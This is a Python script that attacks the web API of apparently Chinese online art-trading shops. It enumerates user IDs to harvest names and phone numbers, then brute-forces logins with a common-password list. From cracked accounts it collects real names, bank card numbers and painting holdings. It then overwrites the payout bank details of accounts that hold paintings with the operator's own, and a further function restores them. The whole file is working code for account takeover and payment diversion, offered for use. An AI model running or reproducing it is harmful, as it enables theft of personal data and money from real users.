#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from datetime import datetime
import sys
import time

from database import Database
import requests


class Action:

    def __init__(self, my_bank, shop_name, url):
        host = url.replace("https://", "").replace("http://", "")
        self.basic_header = {
            "Accept": "application/json, text/plain, */*",
            "Accept - Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "keep-alive",
            "Host": "%s" % host,
            "Origin": "%s" % url,
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63060012)",
            "Content-Type": "application/json; charset=utf-8"
        }

        self.shop_name = shop_name
        self.url = url
        self.my_bank = my_bank

        self.db = Database()

    def __del__(self):
        self.db.db.close()
        print("\n")
        print("关闭数据库连接....")

    def get_user_by_regist_link(self, uid, token=None):
        '''
        根据访问注册链接获取用户部分信息，UID、用户名、电话号码
        :param url: 注册地址的域名
        :return:
        '''
        sub_path = "/web/user/whoIsRecommender"

        session = requests.session()
        flag = uid
        while True:

            req_url = "%s%s" % (self.url, sub_path)

            req_data = {
                "rid": "%d" % uid
                # "token": "%s" % token
            }

            try:
                res = session.post(url=req_url, json=req_data, headers=self.basic_header)

                res_json = res.json()
                print("%s.......%d" % (res_json, uid))
                if res_json["res_code"] == 1 and res_json["data"]["rname"] != "无":
                    uid = uid
                    username = res_json["data"]["rname"]
                    phone = res_json["data"]["rphone"]

                    sql = "INSERT INTO user(shop_name, url, uid, username, phone) VALUE(\"%s\", \"%s\", \"%s\", \"%s\", \"%s\");" % (
                    self.shop_name, self.url, uid, username, phone)

                    self.db.execute_sql(sql)
            except KeyboardInterrupt:
                sys.exit()
            except BaseException as e:
                # if "Connection aborted." == e.args[0].args[0]:
                #     time.sleep(900)
                print("%s.....%d" % (e, uid))
                uid -= 1

            uid += 1
            if uid == 30000:
                break

        session.cookies.clear()

    def try_pwd_to_local(self, uid):
        '''
        把所有的电话号码都尝试破解简单密码
        :return:
        '''
        sub_path = "/web/user/login"

        pwd_list = ["123456", "123456789", "111111", "123123", "12345", "1234567890", "1234567", "qwerty", "abc123", "1234", "iloveyou", "Aa123456789.",
                    "qqww1122", "123", "123321", "654321", "qwer123456", "123456a", "a123456", "666666", "asdfghjki", "987654321", "Aa123456.",
                    "zxcvbnm", "112233", "123123123", "123abc", "123qwe", "121212", "1q2w3e4r", "5201314", "12345678", "0123456789", "Aa1234567890.",
                    "456789", "12345679", "123457", "222222", "333333", "444444", "555555", "777777", "888888", "999999", "qwerty123", "000000", "1q2w3e"]

        user_list = self.db.select_user("SELECT * FROM user WHERE shop_name = \"%s\" AND uid >= %d" % (self.shop_name, uid))
        if user_list:
            count = 1
            for user in user_list:
                session = requests.session()

                index = 1
                for pwd in pwd_list:
                    try:
                        login_data = {
                            "phone": "%s" % user["phone"],
                            "pwd": "%s" % pwd
                        }
                        login_url = "%s%s" % (self.url, sub_path)

                        res = session.post(url=login_url, json=login_data, headers=self.basic_header)

                        res_json = res.json()

                        if res_json["res_code"] == 1 and res_json["msg"] == "登录成功":
                            print(".......%s---password=%s...登录---成功.......%d.......%d" % (user["phone"], pwd, count, index))

                            create_time = res_json["data"]["create_time"]
                            self.db.execute_sql("UPDATE user SET password=\"%s\", create_time=\"%s\" WHERE shop_name=\"%s\" AND uid=\"%s\"" % (pwd, create_time, self.shop_name, user["uid"]))

                            break
                        else:
                            print(".......%s......登录---失败.......%d.......%d" % (user["phone"], count, index))

                        # tc.create_thread(login_url, session, login_data, self.basic_header, self.db, self.shop_name, user["uid"], count)

                    except KeyboardInterrupt:
                        sys.exit()
                    except BaseException as e:
                        print(e)

                    index += 1
                # time.sleep(0.5)

                session.cookies.clear()

                # if count % 10 == 0:
                #     print(datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f"))
                #     time.sleep(65)

                count += 1

    def get_bank_to_local(self):
        '''
        查询用户的银行卡信息
        :param shop_name:
        :param url:
        :param session:
        :param db:
        :return:
        '''
        sub_path = "/web/user/login"

        user_list = self.db.select_user("SELECT * FROM user WHERE shop_name = \"%s\" AND password IS NOT NULL" % self.shop_name)
        if user_list:
            for user in user_list:
                session = requests.session()

                try:
                    # 查询银行卡信息
                    login_data = {
                        "phone": "%s" % user["phone"],
                        "pwd": "%s" % user["password"]
                    }
                    login_url = "%s%s" % (self.url, sub_path)

                    res = session.post(url=login_url, json=login_data, headers=self.basic_header)

                    res_json = res.json()

                    token = res_json["data"]["token"]
                    create_time = res_json["data"]["create_time"]

                    if res_json["res_code"] == 1 and res_json["msg"] == "登录成功":
                        # 获取银行卡信息
                        payee_name = res_json["data"]["payee_name"]
                        payee_bankno = res_json["data"]["payee_bankno"]
                        payee_bankname = res_json["data"]["payee_bankname"]

                        self.db.execute_sql("UPDATE user SET create_time=\"%s\", realname=\"%s\", bank_no=\"%s\", bank=\"%s\" WHERE shop_name=\"%s\" AND uid=\"%s\"" % (create_time, payee_name, payee_bankno, payee_bankname, self.shop_name, user["uid"]))

                        print(".......%s---获取银行卡---成功---%s---%s---%s" % (
                            user["phone"], payee_name, payee_bankno, payee_bankname))
                    else:
                        print(".......%s---获取银行卡---失败" % (user["phone"]))

                except KeyboardInterrupt:
                    sys.exit()
                except BaseException as e:
                    print(e)

                session.cookies.clear()
                # time.sleep(5)

    def get_pic_to_local(self):
        '''
        查询用户拥有的画
        :param shop_name:
        :param url:
        :param session:
        :param db:
        :return:
        '''
        sub_path = "/web/user/login"
        # sub_path = "/api/User"
        storage_path = "/web/user_goods/imSaler"

        user_list = self.db.select_user("SELECT * FROM user WHERE shop_name = \"%s\" AND password IS NOT NULL" % self.shop_name)
        if user_list:
            for user in user_list:
                session = requests.session()

                try:
                    # 查询银行卡信息
                    login_data = {
                        "phone": "%s" % user["phone"],
                        "pwd": "%s" % user["password"]
                    }

                    # login_data = {
                    #     "action": "Operation_User_Login",
                    #     "model": "{\"phone\":\"%s\",\"passwoard\":\"%s\"}" % (user["phone"], user["password"])
                    # }

                    login_url = "%s%s" % (self.url, sub_path)

                    res = session.post(url=login_url, json=login_data, headers=self.basic_header)

                    res_json = res.json()

                    token = res_json["data"]["token"]

                    if res_json["res_code"] == 1 and res_json["msg"] == "登录成功":
                        # 查询用户拥有画的信息
                        storage_url = "%s%s" % (self.url, storage_path)
                        req_data = {
                            "token": "%s" % token
                        }
                        res_storage = session.post(url=storage_url, json=req_data, headers=self.basic_header)
                        res_storage_json = res_storage.json()
                        if res_storage_json["res_code"] == 1:
                            if res_storage_json["data"]:
                                mor_count = 0
                                mor_amount = 0
                                after_count = 0
                                after_amount = 0

                                total_count = len(res_storage_json["data"])
                                total_amount = 0

                                for pic in res_storage_json["data"]:
                                    total_amount += pic["price"]
                                    if pic["schedule_name"] == "狂欢上午场":
                                        mor_count += 1
                                        mor_amount += pic["price"]
                                    elif pic["schedule_name"] == "狂欢下午场":
                                        after_count += 1
                                        after_amount += pic["price"]

                                mor_amount = round(float(mor_amount) / 100, 2)
                                after_amount = round(float(after_amount) / 100, 2)
                                total_amount = round(float(total_amount) / 100, 2)

                                self.db.execute_sql(
                                    "UPDATE user SET have_pic=\"Y\", mor_count=\"%d\", mor_amount=\"%.2f\", after_count=\"%d\", after_amount=\"%.2f\", total_count=\"%d\", total_amount=\"%.2f\" WHERE shop_name=\"%s\" AND uid=\"%s\"" % (mor_count, mor_amount, after_count, after_amount, total_count, total_amount, self.shop_name, user["uid"]))

                                print(".......%s---用户是否有画---有画.......数量---%d.......金额---%.2f" % (user["phone"], total_count, total_amount))
                            else:
                                self.db.execute_sql(
                                    "UPDATE user SET have_pic=NULL, mor_count=NULL, mor_amount=NULL, after_count=NULL, after_amount=NULL, total_count=NULL, total_amount=NULL WHERE shop_name=\"%s\" AND uid=\"%s\"" % (self.shop_name, user["uid"]))
                                print(".......%s---用户是否有画---没有" % user["phone"])

                except KeyboardInterrupt:
                    sys.exit()
                except BaseException as e:
                    print(e)

                session.cookies.clear()
                # time.sleep(5)

    def change_bank_to_my(self):
        '''
        修改用户银行卡
        :param shop_name:
        :param url:
        :param db:
        :return:
        '''
        login_path = "/web/user/login"
        sub_path = "/web/user/updateUserInfo"

        user_list_sql = "SELECT * FROM user WHERE shop_name = \"%s\" AND password IS NOT NULL AND have_pic =\"Y\"" % self.shop_name
        user_list = self.db.select_user(user_list_sql)

        if user_list:
            for user in user_list:
                session = requests.session()
                try:
                    login_data = {
                        "phone": "%s" % user["phone"],
                        "pwd": "%s" % user["password"]
                    }
                    login_url = "%s%s" % (self.url, login_path)

                    res = session.post(url=login_url, json=login_data, headers=self.basic_header)

                    res_json = res.json()
                    token = res_json["data"]["token"]

                    update_bank_url = "%s%s" % (self.url, sub_path)

                    self.my_bank["token"] = "%s" % token

                    res = session.post(url=update_bank_url, json=self.my_bank, headers=self.basic_header)

                    res_json = res.json()

                    if res_json["res_code"] == 1 and res_json["msg"] == "更新成功":
                        print(".......%s.......%s---更新成功" % (self.shop_name, user["phone"]))
                    else:
                        print(".......%s.......%s--更新失败.......%s" % (self.shop_name, user["phone"], res_json))

                except KeyboardInterrupt:
                    sys.exit()
                except BaseException as e:
                    print(e)

                session.cookies.clear()

    def recover_user_bank(self):
        '''
        还原用户的银行卡信息
        :param shop_name:
        :param url:
        :param db:
        :return:
        '''
        login_path = "/web/user/login"
        sub_path = "/web/user/updateUserInfo"

        user_list_sql = "SELECT * FROM user WHERE shop_name = \"%s\" AND password IS NOT NULL AND have_pic =\"Y\"" % self.shop_name
        user_list = self.db.select_user(user_list_sql)

        if user_list:
            for user in user_list:
                session = requests.session()

                try:
                    login_data = {
                        "phone": "%s" % user["phone"],
                        "pwd": "%s" % user["password"]
                    }
                    login_url = "%s%s" % (self.url, login_path)

                    res = session.post(url=login_url, json=login_data, headers=self.basic_header)

                    res_json = res.json()
                    token = res_json["data"]["token"]

                    update_bank_url = "%s%s" % (self.url, sub_path)

                    req_data = {
                        "edit_bank_access": 0,
                        "token": "%s" % token,
                        "payee_name": "%s" % user["realname"],
                        "payee_bankno": "%s" % user["bankno"],
                        "payee_bankname": "%s" % user["bank"]
                    }

                    res = session.post(url=update_bank_url, json=req_data, headers=self.basic_header)
                    res_json = res.json()

                    if res_json["res_code"] == 1 or res_json["msg"] == "更新成功":
                        print(".......%s.......%s---还原成功" % (self.shop_name, user["phone"]))
                    else:
                        print(".......%s.......%s--还原失败" % (self.shop_name, user["phone"]))

                except KeyboardInterrupt:
                    sys.exit()
                except BaseException as e:
                    print(e)

                session.cookies.clear()
